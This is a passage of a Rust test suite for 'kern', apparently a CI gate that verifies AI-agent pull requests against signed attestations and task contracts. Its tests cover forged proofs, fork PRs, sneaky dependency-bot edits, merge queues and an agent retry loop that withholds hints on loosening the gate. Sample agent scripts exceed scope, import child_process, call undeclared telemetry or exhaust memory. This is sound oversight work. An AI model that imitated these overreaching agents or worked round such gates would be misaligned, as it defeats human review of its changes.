        let mut files = git::read_commit(&self.server, parent, 1048576, 16777216).unwrap();
        for (p, c) in edits { files.insert(p.to_string(), file(c)); }
        let c = git::write_commit(&self.server, &files, Some(parent), "someone").unwrap();
        sh(&self.server, &["update-ref", &format!("refs/heads/{branch}"), &c]);
        c
    }
    fn at(&self, branch: &str) -> String { sh(&self.server, &["rev-parse", &format!("refs/heads/{branch}")]) }
    fn api(&self) -> StubApi {
        let srv = self.server.clone();
        stub_api(move |method, path| {
            let q = |args: &[&str]| sh(&srv, args);
            match (method, path.split('?').next().unwrap_or("")) {
                ("GET", p) if p.starts_with("/repos/acme/project/git/ref/heads/") => (200, json!({ "object": { "sha": q(&["rev-parse", &format!("refs/heads/{}", &p["/repos/acme/project/git/ref/heads/".len()..])]) } }).to_string()),
                ("GET", p) if p.starts_with("/repos/acme/project/compare/") => {
                    let (a, b) = p["/repos/acme/project/compare/".len()..].split_once("...").unwrap();
                    let fork = q(&["merge-base", a, b]);
                    let status = if a == b { "identical" } else if fork == a { "ahead" } else if fork == b { "behind" } else { "diverged" };
                    (200, json!({ "status": status, "merge_base_commit": { "sha": fork } }).to_string())
                }
                ("PATCH", "/repos/acme/project/pulls/7") => (200, "{}".into()),
                ("POST", "/repos/acme/project/check-runs") => (201, json!({ "id": 1 }).to_string()),
                ("GET", "/repos/acme/project/issues/7/comments") => (200, "[]".into()),
                ("POST", "/repos/acme/project/issues/7/comments") => (201, "{}".into()),
                _ => (404, "{}".into()),
            }
        })
    }
    fn verifier(&self, refuse: Option<&'static str>) -> StubApi {
        let (policy, op, key) = (self.policy.clone(), self.op.clone(), self.key.clone());
        stub_server(move |method, path, body| {
            if (method, path) != ("POST", "/v1/verify") { return (404, "{}".into()); }
            if let Some(why) = refuse { return (422, json!({ "status": "DENIED", "reason": why }).to_string()); }
            let run = serde_json::from_str::<Value>(body).unwrap()["run"].clone();
            let k = kern_payload(&policy, &op, run["run_id"].as_str().unwrap(), run["base"].as_str().unwrap(), run["commit"].as_str().unwrap(), run["manifest_sha256"].as_str().unwrap(), now_ms() - 1000);
            (200, attest::sign(&k, &KeySource::File(key.clone())).unwrap().to_string())
        })
    }
    fn check(&self, head: &str, event_base: &str, body: &str, api: &StubApi, verifier: Option<&StubApi>, fork: bool) -> (Checked, Value) {
        let dir = self.t.join(&format!("check-{}", uuid4().unwrap()));
        let checkout = dir.join("checkout");
        std::fs::create_dir_all(&checkout).unwrap();
        sh(&checkout, &["init", "-q"]);
        sh(&checkout, &["fetch", "-q", "--depth=2", &format!("{}/acme/project.git", self.url), head]);
        let event = json!({ "repository": { "full_name": "acme/project" }, "pull_request": { "number": 7, "body": body,
            "head": { "sha": head, "ref": self.branch, "repo": { "full_name": if fork { "mallory/project" } else { "acme/project" } } },
            "base": { "sha": event_base, "ref": "main", "repo": { "full_name": "acme/project" } } } });
        std::fs::write(dir.join("event.json"), event.to_string()).unwrap();
        api.seen.lock().unwrap().clear();
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_kern"));
        cmd.arg("check-pr").arg(dir.join("event.json")).arg(&checkout).env("GITHUB_STEP_SUMMARY", dir.join("summary.md")).env("GITHUB_OUTPUT", dir.join("output.txt"))
            .env("KERN_FEEDBACK_PATH", dir.join("feedback.json")).env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k3n").env("GITHUB_SERVER_URL", &self.url).env("KERN_PR_COMMENTS", "true");
        if let Some(v) = verifier { cmd.env("KERN_VERIFIER_URL", &v.url).env("KERN_VERIFIER_TOKEN", "v3r1f13r"); }
        let out = cmd.output().unwrap();
        let read = |n: &str| std::fs::read_to_string(dir.join(n)).unwrap_or_default();
        let seen = api.seen.lock().unwrap().clone();
        let posted = seen.iter().filter(|(m, p, _)| m == "POST" && p == "/repos/acme/project/issues/7/comments").map(|(_, _, b)| serde_json::from_str::<Value>(b).unwrap()["body"].as_str().unwrap().to_string()).collect();
        let of = |method: &str, path: &str| seen.iter().filter(|(m, p, _)| m == method && p == path).map(|(_, _, b)| serde_json::from_str::<Value>(b).unwrap_or(Value::Null)).collect::<Vec<_>>();
        let calls = json!({ "patched": of("PATCH", "/repos/acme/project/pulls/7"), "checks": of("POST", "/repos/acme/project/check-runs"), "stderr": String::from_utf8_lossy(&out.stderr) });
        (Checked { code: out.status.code(), summary: read("summary.md"), output: read("output.txt"), feedback: serde_json::from_str(&read("feedback.json")).ok(), posted }, calls)
    }
    fn body(&self, envelope: &Value, commit: &str) -> String {
        let d = promote::Decision { repository: "acme/project".into(), branch: self.branch.clone(), base: self.base0.clone(), commit: commit.into(), run_id: self.run_id.clone(), attestation: Value::Null };
        promote::pr_body("fix-addition", &d, envelope, None).unwrap()
    }
}

#[test]
fn an_agent_push_is_verified_again_and_the_branch_moves_to_the_verified_commit() {
    let h = hub();
    let pushed = h.commit(&h.c0, &[("src/add.mjs", "export const add = (a, b) => b + a;\n")], &h.branch);
    let base1 = h.commit(&h.base0, &[("README.md", "A fixture, documented\n")], "main");
    let (api, verifier) = (h.api(), h.verifier(None));
    let (r, calls) = h.check(&pushed, &h.base0, &h.body(&h.envelope, &h.c0), &api, Some(&verifier), false);
    assert_eq!(r.code, Some(0), "{} {calls}", r.summary);
    let moved = h.at(&h.branch);
    assert!(moved != pushed && git::parents(&h.server, &moved).unwrap() == vec![base1.clone()], "{moved}");
    let tree = git::read_commit(&h.server, &moved, 65536, 1048576).unwrap();
    assert_eq!((tree["src/add.mjs"].bytes.as_deref(), tree["README.md"].bytes.as_deref()), (Some(&b"export const add = (a, b) => b + a;\n"[..]), Some(&b"A fixture, documented\n"[..])));
    assert!(String::from_utf8_lossy(&git::git(&h.server, &["cat-file", "commit", &moved], None).unwrap()).contains("author Kern <kern@invalid> 0 +0000"));
    let sent = verifier.seen.lock().unwrap().iter().map(|(_, _, b)| serde_json::from_str::<Value>(b).unwrap()["run"].clone()).collect::<Vec<_>>();
    assert_eq!((sent.len(), sent[0]["run_id"].as_str(), sent[0]["base"].as_str(), sent[0]["commit"].as_str()), (1, Some(h.run_id.as_str()), Some(base1.as_str()), Some(moved.as_str())));
    let body = calls["patched"][0]["body"].as_str().unwrap().to_string();
    let proof: Value = serde_json::from_slice(&unb64(promote::extract_attestation(&body).unwrap()["payload"].as_str().unwrap()).unwrap()).unwrap();
    assert_eq!(proof["predicate"][attest::EXTENSION]["commit"], moved.as_str());
    assert_eq!(calls["checks"], json!([{ "name": "kern-verified", "head_sha": moved, "status": "completed", "conclusion": "success",
        "output": calls["checks"][0]["output"].clone() }]), "{calls}");
    assert!(r.output.contains("status=PASS") && r.posted.len() == 1 && r.posted[0].contains("verified the change again") && r.posted[0].contains(&moved[..12]), "{:?}", r.posted);
    let (rerun, calls_rerun) = h.check(&pushed, &h.base0, &h.body(&h.envelope, &h.c0), &api, Some(&verifier), false);
    assert!(rerun.code == Some(0) && rerun.output.contains("status=PASS") && h.at(&h.branch) == moved && calls_rerun["patched"].as_array().unwrap().len() == 1, "{} {calls_rerun}", rerun.summary);
    let quiet = h.verifier(Some("must not be called"));
    let (again, calls2) = h.check(&moved, &base1, &body, &api, Some(&quiet), false);
    assert!(again.code == Some(0) && quiet.seen.lock().unwrap().is_empty() && calls2["checks"].as_array().unwrap().is_empty(), "{} {calls2}", again.summary);
    let newer = h.commit(&moved, &[("src/add.mjs", "export const add = (a, b) => a + b + 0;\n")], &h.branch);
    let stale = h.commit(&moved, &[("src/add.mjs", "export const add = (a, b) => 0 + a + b;\n")], "elsewhere");
    let (lost, calls3) = h.check(&stale, &base1, &body, &api, Some(&h.verifier(None)), false);
    assert!(lost.code == Some(0) && lost.output.contains("status=SUPERSEDED") && h.at(&h.branch) == newer && calls3["checks"].as_array().unwrap().is_empty() && calls3["patched"].as_array().unwrap().is_empty(), "{} {calls3}", lost.summary);
}

impl Hub {
    fn group(&self, base: &str, tree_of: &str, parent2: &str) -> String {
        let tree = sh(&self.server, &["rev-parse", &format!("{tree_of}^{{tree}}")]);
        let m = sh(&self.server, &["commit-tree", &tree, "-p", base, "-p", parent2, "-m", "Merge pull request #7"]);
        sh(&self.server, &["update-ref", &format!("refs/heads/gh-readonly-queue/main/pr-7-{parent2}"), &m]);
        m
    }
    fn queue_api(&self, pr_head: &str, body: &str) -> StubApi {
        let (srv, branch, pr_head, body) = (self.server.clone(), self.branch.clone(), pr_head.to_string(), body.to_string());
        stub_api(move |method, path| match (method, path.split('?').next().unwrap_or("")) {
            ("GET", "/repos/acme/project/pulls/7") => (200, json!({ "number": 7, "body": body, "head": { "ref": branch, "sha": pr_head, "repo": { "full_name": "acme/project" } },
                "base": { "ref": "main", "sha": sh(&srv, &["rev-parse", "refs/heads/main"]), "repo": { "full_name": "acme/project" } } }).to_string()),
            ("PATCH", "/repos/acme/project/pulls/7") => (200, "{}".into()),
            ("GET", "/repos/acme/project/issues/7/comments") => (200, "[]".into()),
            _ => (404, "{}".into()),
        })
    }
    fn queue(&self, group: &str, base: &str, pr_head: &str, api: &StubApi, verifier: Option<&StubApi>) -> (Checked, Value) {
        let dir = self.t.join(&format!("queue-{}", uuid4().unwrap()));
        std::fs::create_dir_all(dir.join("workspace")).unwrap();
        let event = json!({ "repository": { "full_name": "acme/project" }, "merge_group": { "head_sha": group, "head_ref": format!("refs/heads/gh-readonly-queue/main/pr-7-{pr_head}"), "base_sha": base, "base_ref": "refs/heads/main" } });
        std::fs::write(dir.join("event.json"), event.to_string()).unwrap();
        api.seen.lock().unwrap().clear();
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_kern"));
        cmd.arg("check-pr").arg(dir.join("event.json")).arg(dir.join("workspace")).env("GITHUB_STEP_SUMMARY", dir.join("summary.md")).env("GITHUB_OUTPUT", dir.join("output.txt"))
            .env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k3n").env("GITHUB_SERVER_URL", &self.url);
        if let Some(v) = verifier { cmd.env("KERN_VERIFIER_URL", &v.url).env("KERN_VERIFIER_TOKEN", "v3r1f13r"); }
        let out = cmd.output().unwrap();
        let read = |n: &str| std::fs::read_to_string(dir.join(n)).unwrap_or_default();
        let patched: Vec<Value> = api.seen.lock().unwrap().iter().filter(|(m, _, _)| m == "PATCH").map(|(_, _, b)| serde_json::from_str(b).unwrap()).collect();
        (Checked { code: out.status.code(), summary: read("summary.md"), output: read("output.txt"), feedback: None, posted: Vec::new() }, json!(patched))
    }
}

#[test]
fn a_merge_queue_lands_exactly_what_kern_verified() {
    let h = hub();
    let body = h.body(&h.envelope, &h.c0);
    let group = h.group(&h.base0, &h.c0, &h.c0);
    let quiet = h.verifier(Some("must not be called"));
    let (r, _) = h.queue(&group, &h.base0, &h.c0, &h.queue_api(&h.c0, &body), Some(&quiet));
    assert!(r.code == Some(0) && r.output.contains("status=PASS") && quiet.seen.lock().unwrap().is_empty(), "{}", r.summary);
    let base1 = h.commit(&h.base0, &[("README.md", "A fixture, documented\n")], "main");
    let mut onto = git::read_commit(&h.server, &base1, 1048576, 16777216).unwrap();
    onto.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let merged = git::write_commit(&h.server, &onto, Some(&base1), "merged").unwrap();
    let moved = h.group(&base1, &merged, &h.c0);
    let (off, _) = h.queue(&moved, &base1, &h.c0, &h.queue_api(&h.c0, &body), None);
    assert!(off.code == Some(1) && off.summary.contains("Attestation mismatch: base"), "{}", off.summary);
    let verifier = h.verifier(None);
    let (again, patched) = h.queue(&moved, &base1, &h.c0, &h.queue_api(&h.c0, &body), Some(&verifier));
    assert!(again.code == Some(0) && again.output.contains("status=PASS"), "{}", again.summary);
    let sent: Vec<Value> = verifier.seen.lock().unwrap().iter().map(|(_, _, b)| serde_json::from_str::<Value>(b).unwrap()["run"].clone()).collect();
    assert_eq!((sent.len(), sent[0]["base"].as_str(), sent[0]["run_id"].as_str()), (1, Some(base1.as_str()), Some(h.run_id.as_str())));
    let proof: Value = serde_json::from_slice(&unb64(promote::extract_attestation(patched[0]["body"].as_str().unwrap()).unwrap()["payload"].as_str().unwrap()).unwrap()).unwrap();
    let k = &proof["predicate"][attest::EXTENSION];
    let lands = git::write_commit(&h.server, &git::read_commit(&h.server, &moved, 1048576, 16777216).unwrap(), Some(&base1), "fix-addition").unwrap();
    assert_eq!((k["base"].as_str(), k["commit"].as_str()), (Some(base1.as_str()), Some(lands.as_str())),
        "the recorded proof covers exactly the tree the queue lands, on its base, so the merge audit finds it");
    let extra = h.commit(&h.c0, &[("src/other.mjs", "export const o = 1;\n")], "extra");
    let mixed = h.group(&h.base0, &extra, &h.c0);
    let (refused, _) = h.queue(&mixed, &h.base0, &h.c0, &h.queue_api(&h.c0, &body), None);
    assert_eq!(refused.code, Some(1), "{}", refused.summary);
    let ordinary = stub_api(|method, path| match (method, path) {
        ("GET", "/repos/acme/project/pulls/7") => (200, json!({ "number": 7, "body": "", "head": { "ref": "feature/x", "sha": "a".repeat(40), "repo": { "full_name": "acme/project" } }, "base": { "ref": "main", "repo": { "full_name": "acme/project" } } }).to_string()),
        _ => (404, "{}".into()),
    });
    let (skipped, _) = h.queue(&group, &h.base0, &"a".repeat(40), &ordinary, None);
    assert!(skipped.code == Some(0) && skipped.output.contains("status=SKIPPED"), "{}", skipped.summary);
}

#[test]
fn a_dependency_upgrade_from_a_bot_is_verified_through_the_hosted_verifier() {
    let h = hub();
    let up = json!({ "version": 5, "task": "upgrade", "filesystem": { "read": [], "write": [] }, "network": [], "secrets": [], "publish": false,
        "dependencies": { "manager": "npm", "lockfile": "package-lock.json", "allow": ["*"] },
        "limits": { "files_changed": 2, "lines_changed": 100000, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 60, "memory_mb": 256, "pids": 64 },
        "required_checks": ["addition"], "behaviors": [], "tests": null, "delta": { "intent": "Upgrade dependencies; nothing changes", "changes": [] }, "app": null });
    let manifest = |v: &str| npm_manifest(&[("lodash", &format!("^{v}"))], json!({ "test": "mocha" }));
    let lockfile = |v: &str| npm_lock(&[("lodash", &format!("^{v}"))], &[("lodash", v, &[])]);
    let base1 = h.commit(&h.base0, &[(".github/kern/tasks/upgrade.json", &up.to_string()), ("package.json", &manifest("4.17.20")), ("package-lock.json", &lockfile("4.17.20"))], "main");
    let bump = h.commit(&base1, &[("package.json", &manifest("4.17.21")), ("package-lock.json", &lockfile("4.17.21"))], "renovate/lodash-4.x");
    let (policy, op, key) = (contract(&up).unwrap(), h.op.clone(), h.key.clone());
    let verifier = stub_server(move |method, path, body| {
        if (method, path) != ("POST", "/v1/verify") { return (404, "{}".into()); }
        let run = serde_json::from_str::<Value>(body).unwrap()["run"].clone();
        let k = kern_payload(&policy, &op, run["run_id"].as_str().unwrap(), run["base"].as_str().unwrap(), run["commit"].as_str().unwrap(), run["manifest_sha256"].as_str().unwrap(), now_ms() - 1000);
        (200, attest::sign(&k, &KeySource::File(key.clone())).unwrap().to_string())
    });
    let api = h.api();
    let run = |head: &str, branch: &str, verifier: Option<&StubApi>| -> (Option<i32>, Value, String) {
        let dir = h.t.join(&format!("up-{}", uuid4().unwrap()));
        let checkout = dir.join("checkout");
        std::fs::create_dir_all(&checkout).unwrap();
        sh(&checkout, &["init", "-q"]);
        sh(&checkout, &["fetch", "-q", "--depth=2", &format!("{}/acme/project.git", h.url), head]);
        std::fs::write(dir.join("event.json"), json!({ "repository": { "full_name": "acme/project" }, "pull_request": { "number": 9, "body": "Bumps lodash",
            "head": { "sha": head, "ref": branch, "repo": { "full_name": "acme/project" } }, "base": { "sha": base1, "ref": "main", "repo": { "full_name": "acme/project" } } } }).to_string()).unwrap();
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_kern"));
        cmd.arg("check-pr").arg(dir.join("event.json")).arg(&checkout).env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k3n").env("GITHUB_SERVER_URL", &h.url).env("GITHUB_STEP_SUMMARY", dir.join("summary.md"));
        if let Some(v) = verifier { cmd.env("KERN_VERIFIER_URL", &v.url).env("KERN_VERIFIER_TOKEN", "v3r1f13r"); }
        let out = cmd.output().unwrap();
        (out.status.code(), serde_json::from_slice(&out.stdout).unwrap_or(Value::Null), String::from_utf8_lossy(&out.stderr).to_string())
    };
    let (code, r, err) = run(&bump, "renovate/lodash-4.x", Some(&verifier));
    assert!(code == Some(0) && r["status"] == "PASS" && r["upgrade"] == true, "{r} {err}");
    assert_eq!(r["changes"]["dependencies"]["upgraded"], json!(["lodash"]), "{r}");
    let sent: Vec<Value> = verifier.seen.lock().unwrap().iter().map(|(_, _, b)| serde_json::from_str::<Value>(b).unwrap()["run"].clone()).collect();
    assert!(sent.len() == 1 && sent[0]["base"] == base1.as_str(), "the verifier saw the upgrade on its base: {sent:?}");
    let expected = git::write_commit(&h.server, &git::read_commit(&h.server, &bump, 1048576, 16777216).unwrap(), Some(&base1), "upgrade").unwrap();
    assert_eq!((sent[0]["commit"].as_str(), r["verified_commit"].as_str()), (Some(expected.as_str()), Some(expected.as_str())));
    let (code, r, _) = run(&bump, "renovate/lodash-4.x", None);
    assert!(code == Some(0) && r["status"] == "SKIPPED" && r["reason"].as_str().unwrap().contains("Dependabot"), "{r}");
    let sneaky = h.commit(&base1, &[("package.json", &manifest("4.17.21")), ("package-lock.json", &lockfile("4.17.21")), ("src/add.mjs", "export const add = (a, b) => a * b;\n")], "renovate/sneaky");
    let quiet = h.verifier(Some("must not be called"));
    let (code, _, err) = run(&sneaky, "renovate/sneaky", Some(&quiet));
    assert!(code == Some(1) && err.contains("Write outside contract: src/add.mjs") && quiet.seen.lock().unwrap().is_empty(), "{err}");
    let (code, r, _) = run(&bump, "feature/lodash", Some(&quiet));
    assert!(code == Some(0) && r["status"] == "SKIPPED" && quiet.seen.lock().unwrap().is_empty(), "{r}");
}

#[test]
fn a_push_that_cannot_be_verified_again_stays_blocked_and_says_why() {
    let h = hub();
    let pushed = h.commit(&h.c0, &[("src/add.mjs", "export const add = (a, b) => b + a;\n")], &h.branch);
    let body = h.body(&h.envelope, &h.c0);
    let h2 = hub();
    let pushed2 = h2.commit(&h2.c0, &[("src/add.mjs", "export const add = (a, b) => b + a;\n")], &h2.branch);
    h2.commit(&h2.base0, &[("src/add.mjs", "export const add = (a, b) => a - b; // reviewed\n")], "main");
    let (conflict, _) = h2.check(&pushed2, &h2.base0, &h2.body(&h2.envelope, &h2.c0), &h2.api(), Some(&h2.verifier(None)), false);
    let f = conflict.feedback.clone().expect("feedback");
    assert!(conflict.code == Some(1) && f["agent_fixable"] == true && f["violations"][0]["rule"] == "base-conflict" && conflict.summary.contains("src/add.mjs"), "{f} {}", conflict.summary);
    assert_eq!(h2.at(&h2.branch), pushed2, "nothing moves");
    let api = h.api();
    let (refused, calls) = h.check(&pushed, &h.base0, &body, &api, Some(&h.verifier(Some("Tests show new runtime behavior: net:telemetry.invalid:443. If this is intended, allow it in the task contract (version 3): \"behaviors\": [\"net:telemetry.invalid:443\"]"))), false);
    assert!(refused.code == Some(1) && refused.summary.contains("net:telemetry.invalid:443") && h.at(&h.branch) == pushed && calls["checks"].as_array().unwrap().is_empty(), "{} {calls}", refused.summary);
    let forged = attest::sign(&serde_json::from_slice::<Value>(&unb64(h.envelope["payload"].as_str().unwrap()).unwrap()).unwrap()["predicate"][attest::EXTENSION], &KeySource::File(SigningKey::from_bytes(&random_bytes::<32>().unwrap()))).unwrap();
    let never = h.verifier(Some("must not be called"));
    let (untrusted, _) = h.check(&pushed, &h.base0, &h.body(&forged, &h.c0), &api, Some(&never), false);
    assert!(untrusted.code == Some(1) && never.seen.lock().unwrap().is_empty(), "{}", untrusted.summary);
    let (forked, _) = h.check(&pushed, &h.base0, &body, &api, Some(&never), true);
    assert!(forked.code == Some(1) && never.seen.lock().unwrap().is_empty(), "{}", forked.summary);
    let (off, _) = h.check(&pushed, &h.base0, &body, &api, None, false);
    let f = off.feedback.clone().expect("feedback");
    assert!(off.code == Some(1) && f["agent_fixable"] == false && f["violations"][0]["rule"] == "proof-stale" && off.summary.contains("verifier-url"), "{f} {}", off.summary);
}

#[test]
fn the_pr_gate_hands_its_verdict_to_the_agent_with_a_retry_cap() {
    let widened = pr_gate("import { exec } from 'node:child_process';\nexport const add = (a, b) => a + b;\n");
    let on = [("KERN_PR_COMMENTS", "true"), ("KERN_AGENT_MENTION", "@claude"), ("KERN_MAX_ATTEMPTS", "2")];
    let first = check_pr_with(&widened, &widened.envelope, &comments_api("[]".into()), &on);
    assert_eq!(first.code, Some(1));
    let f = first.feedback.clone().expect("feedback file");
    assert_eq!((f["schema"].as_str(), f["violations"][0]["rule"].as_str(), f["attempt"].as_u64(), f["max_attempts"].as_u64()), (Some("kern-feedback/v1"), Some("capability"), Some(1), Some(2)), "{f}");
    assert!(first.output.contains("status=DENIED") && first.output.contains("feedback="), "{}", first.output);
    assert!(first.summary.contains("`node:child_process`"), "{}", first.summary);
    assert!(f.get("reason").is_none() && f["violations"][0].get("allow").is_none(), "the agent's copy carries no hint about loosening the gate: {f}");
    assert!(first.summary.contains("operator.json"), "maintainers still see how to allow it: {}", first.summary);
    assert_eq!(first.posted.len(), 1);
    assert!(first.posted[0].contains("@claude") && first.posted[0].contains("attempt 1 of 2") && first.posted[0].contains(&format!("<!-- kern-feedback:v1 head={} -->", widened.head)), "{}", first.posted[0]);
    let (a, b) = ("1".repeat(40), "2".repeat(40));
    let bot = "github-actions[bot]";
    let exhausted = check_pr_with(&widened, &widened.envelope, &comments_api(previous(&[(bot, &a), ("mallory", &"3".repeat(40)), (bot, &b), (bot, &b)])), &on);
    assert!(!exhausted.posted[0].contains("@claude") && exhausted.posted[0].contains("attempt 3") && exhausted.posted[0].contains("human"), "{}", exhausted.posted[0]);
    let rerun = check_pr_with(&widened, &widened.envelope, &comments_api(previous(&[(bot, &a), (bot, &widened.head)])), &on);
    assert!(rerun.code == Some(1) && rerun.posted.is_empty() && rerun.feedback.as_ref().unwrap()["attempt"] == 2, "{:?} {:?}", rerun.posted, rerun.feedback);
    let mut pushed = pr_gate("export const add = (a, b) => a + b;\n");
    let mut files = git::read_commit(&pushed.repo, &pushed.head, 1048576, 16777216).unwrap();
    files.insert("src/add.mjs".into(), file("export const add = (a, b) => b + a;\n"));
    pushed.head = git::write_commit(&pushed.repo, &files, Some(&pushed.head), "pushed").unwrap();
    let stale = check_pr_with(&pushed, &pushed.envelope, &comments_api("[]".into()), &on);
    let sf = stale.feedback.clone().unwrap();
    assert!(stale.code == Some(1) && sf["agent_fixable"] == false && sf["violations"][0]["rule"] == "proof-stale", "{sf}");
    assert!(!stale.posted[0].contains("@claude") && stale.summary.contains("verifier-url"), "{}", stale.summary);
    let forged = attest::sign(&serde_json::from_slice::<Value>(&unb64(widened.envelope["payload"].as_str().unwrap()).unwrap()).unwrap()["predicate"][attest::EXTENSION], &KeySource::File(SigningKey::from_bytes(&random_bytes::<32>().unwrap()))).unwrap();
    let untrusted = check_pr_with(&widened, &forged, &comments_api("[]".into()), &on);
    assert!(untrusted.code == Some(1) && !untrusted.posted[0].contains("@claude") && untrusted.posted[0].contains("not something the agent can fix"), "{}", untrusted.posted[0]);
    let fixed = pr_gate("export const add = (a, b) => a + b;\n");
    let pass = check_pr_with(&fixed, &fixed.envelope, &comments_api(previous(&[(bot, &a)])), &on);
    assert_eq!(pass.code, Some(0));
    assert!(pass.summary.contains("after 1 rejected attempt") && pass.output.contains("status=PASS"), "{}", pass.summary);
    assert!(pass.posted.len() == 1 && pass.posted[0].contains("after 1 rejected attempt") && !pass.posted[0].contains("<!-- kern-feedback:v1 head="), "{:?}", pass.posted);
    assert!(check_pr_with(&fixed, &fixed.envelope, &comments_api("[]".into()), &on).posted.is_empty(), "a first-time pass adds no comment");
    let down = stub_api(|_, _| (500, "{}".into()));
    let failed_post = check_pr_with(&widened, &widened.envelope, &down, &on);
    assert!(failed_post.code == Some(1) && failed_post.summary.contains("could not post") && failed_post.feedback.is_some(), "{}", failed_post.summary);
    let quiet = check_pr_with(&widened, &widened.envelope, &comments_api("[]".into()), &[]);
    assert!(quiet.code == Some(1) && quiet.posted.is_empty() && quiet.feedback.is_some());
    assert!(quiet.output.contains("status=DENIED"));
}

#[test]
fn container_run_feeds_rejections_back_to_the_agent_until_it_complies() {
    if !container_ready() { return; }
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    std::fs::write(repo.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    std::fs::write(repo.join("README.md"), "# fixture\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    std::fs::write(t.join("task.json"), policy_value().to_string()).unwrap();
    let agent = "const fs = require('fs'); const raw = process.env.KERN_FEEDBACK; \
        if (!raw) { fs.writeFileSync('README.md', 'agent was here\\n'); process.exit(0); } \
        const f = JSON.parse(raw); \
        if (f.schema !== 'kern-feedback/v1' || f.attempt !== 1 || f.max_attempts !== 3 || f.violations[0].rule !== 'scope' || f.violations[0].path !== 'README.md') process.exit(9); \
        fs.writeFileSync('README.md', '# fixture\\n'); fs.writeFileSync('src/add.mjs', 'export const add = (a, b) => a + b;\\n');";
    let run = |name: &str, script: &str, attempts: u64| {
        std::fs::write(t.join(name), json!({ "version": 2, "repo": "./repo", "base": base, "contract": "./task.json", "image": NODE, "attempts": attempts,
            "command": ["/usr/local/bin/node", "-e", script], "network": false, "output": "./runs", "promote": true }).to_string()).unwrap();
        kern::local::local_run(&kern::local::run_job(&t.join(name)).unwrap()).unwrap()
    };
    let r = run("loop.json", agent, 3);
    assert_eq!(r["status"], "GREEN", "{r}");
    let attempts = r["attempts"].as_array().unwrap();
    assert_eq!(attempts.len(), 2, "{r}");
    assert_eq!((attempts[0]["status"].as_str(), attempts[0]["feedback"]["violations"][0]["rule"].as_str(), attempts[1]["status"].as_str()), (Some("BLOCKED"), Some("scope"), Some("GREEN")), "{r}");
    assert!(r["summary"].as_str().unwrap().contains("after 1 rejected attempt"), "{r}");
    let branch = r["promotion"]["branch"].as_str().unwrap();
    assert_eq!(sh(&repo, &["show", &format!("{branch}:src/add.mjs")]), "export const add = (a, b) => a + b;");
    assert_eq!(sh(&repo, &["show", &format!("{branch}:README.md")]), "# fixture", "the agent undid its out-of-scope edit");
    let stubborn = run("stubborn.json", "require('fs').writeFileSync('README.md', 'again\\n')", 2);
    assert!(stubborn["status"] == "BLOCKED" && stubborn["attempts"].as_array().unwrap().len() == 2 && stubborn["feedback"]["violations"][0]["rule"] == "scope", "{stubborn}");
    let hungry = run("hungry.json", "const a = []; for (;;) a.push(Buffer.alloc(1 << 20, 1));", 3);
    assert!(hungry["status"] == "BLOCKED" && hungry["attempts"].as_array().unwrap().len() == 1 && hungry["feedback"]["agent_fixable"] == false, "{hungry}");
}

fn git_at(dir: &Path, date: &str, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@t")
        .env("GIT_CONFIG_NOSYSTEM", "1").env("GIT_AUTHOR_DATE", date).env("GIT_COMMITTER_DATE", date).output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
#[test]
fn merge_audit_reverifies_every_change_to_the_branch_and_lists_the_gaps() {
    let f = fixture();
    let repo = f.t.join("audited");
    sh(&f.t.0, &["init", "-q", "audited"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in &f.original { std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap(); std::fs::write(repo.join(p), c.bytes.as_deref().unwrap()).unwrap(); }
    std::fs::create_dir_all(repo.join(".github/kern/tasks")).unwrap();
    std::fs::write(repo.join(".github/kern/operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(repo.join(".github/kern/verifier.pub"), &f.public).unwrap();
    std::fs::write(repo.join(".github/kern/tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    sh(&repo, &["add", "-A"]);
    git_at(&repo, "2026-01-10T10:00:00Z", &["commit", "-qm", "setup"]);
    let main = |sha: &str| { sh(&repo, &["update-ref", "refs/heads/audit-main", sha]); sh(&repo, &["reset", "-q", "--hard", sha]); };
    let setup = sh(&repo, &["rev-parse", "HEAD"]);
    let (policy, op) = (contract(&policy_value()).unwrap(), operator(&operator_value(&["external"])).unwrap());
    let agent_change = |base: &str, text: &str| -> String {
        let mut files = git::read_commit(&repo, base, 1048576, 16777216).unwrap();
        files.insert("src/add.mjs".into(), file(text));
        git::write_commit(&repo, &files, Some(base), "fix-addition").unwrap()
    };
    let proof = |base: &str, head: &str, key: &SigningKey| -> (String, Value) {
        let run_id = uuid4().unwrap();
        let manifest = digest(&git::manifest(&repo, head, 65536, 1048576).unwrap()).unwrap();
        (run_id.clone(), attest::sign(&kern_payload(&policy, &op, &run_id, base, head, &manifest, now_ms() - 1000), &KeySource::File(key.clone())).unwrap())
    };
    let squash = |head: &str, parent: &str, date: &str, title: &str| git_at(&repo, date, &["commit-tree", &format!("{head}^{{tree}}"), "-p", parent, "-m", title]);
    let h1 = agent_change(&setup, "export const add = (a, b) => a + b;\n");
    sh(&repo, &["update-ref", "refs/remotes/pull/1/head", &h1]);
    let (run1, env1) = proof(&setup, &h1, &f.key);
    let m1 = squash(&h1, &setup, "2026-04-02T10:00:00Z", "Kern: fix-addition (#1)");
    main(&m1);
    std::fs::write(repo.join("README.md"), "A fixture, now documented\n").unwrap();
